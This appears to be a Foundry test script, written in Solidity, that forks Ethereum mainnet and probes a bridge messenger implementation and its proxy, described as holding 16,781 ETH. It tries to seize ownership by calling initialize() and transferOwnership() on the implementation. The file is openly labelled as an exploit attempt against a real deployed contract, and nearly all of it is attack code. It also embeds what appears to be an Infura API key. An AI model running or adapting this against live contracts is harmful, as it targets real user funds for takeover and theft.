// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IL1ScrollMessenger {
    function owner() external view returns (address);
    function counterpart() external view returns (address);
    function rollup() external view returns (address);
    function messageQueue() external view returns (address);
    function initialize(address, address, address) external;
    function transferOwnership(address) external;
    function updateFeeVault(address) external;
}

contract ScrollMessengerExploitTest is Test {
    // The implementation contract
    address constant IMPL = 0x79b6eAbfFAa958FDF2Aa2Bf632878bD323DCbF69;
    // The proxy contract with 16,781 ETH
    address constant PROXY = 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367;
    
    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testExploitScrollMessenger() public {
        console.log("=== SCROLL MESSENGER EXPLOIT ATTEMPT ===");
        console.log("Implementation:", IMPL);
        console.log("Proxy:", PROXY);
        console.log("Proxy balance:", PROXY.balance / 1e18, "ETH");
        
        IL1ScrollMessenger impl = IL1ScrollMessenger(IMPL);
        IL1ScrollMessenger proxy = IL1ScrollMessenger(PROXY);
        
        // Check implementation state
        console.log("\n--- Implementation State ---");
        try impl.owner() returns (address o) {
            console.log("Impl owner:", o);
        } catch {}
        
        // Check proxy state  
        console.log("\n--- Proxy State ---");
        try proxy.owner() returns (address o) {
            console.log("Proxy owner:", o);
        } catch {}
        
        try proxy.counterpart() returns (address c) {
            console.log("Counterpart:", c);
        } catch {}
        
        try proxy.rollup() returns (address r) {
            console.log("Rollup:", r);
        } catch {}
        
        // Try to initialize the IMPLEMENTATION (not proxy)
        console.log("\n--- Trying to Initialize Implementation ---");
        try impl.initialize(address(this), address(this), address(this)) {
            console.log("!!! INITIALIZED IMPLEMENTATION !!!");
            try impl.owner() returns (address newOwner) {
                console.log("New owner:", newOwner);
            } catch {}
        } catch Error(string memory reason) {
            console.log("Init failed:", reason);
        } catch {
            console.log("Init failed (no reason)");
        }
        
        // Try to transfer ownership on implementation
        console.log("\n--- Trying to Transfer Ownership ---");
        try impl.transferOwnership(address(this)) {
            console.log("!!! OWNERSHIP TRANSFERRED !!!");
        } catch Error(string memory reason) {
            console.log("Transfer failed:", reason);
        } catch {
            console.log("Transfer failed (no reason)");
        }
    }
}
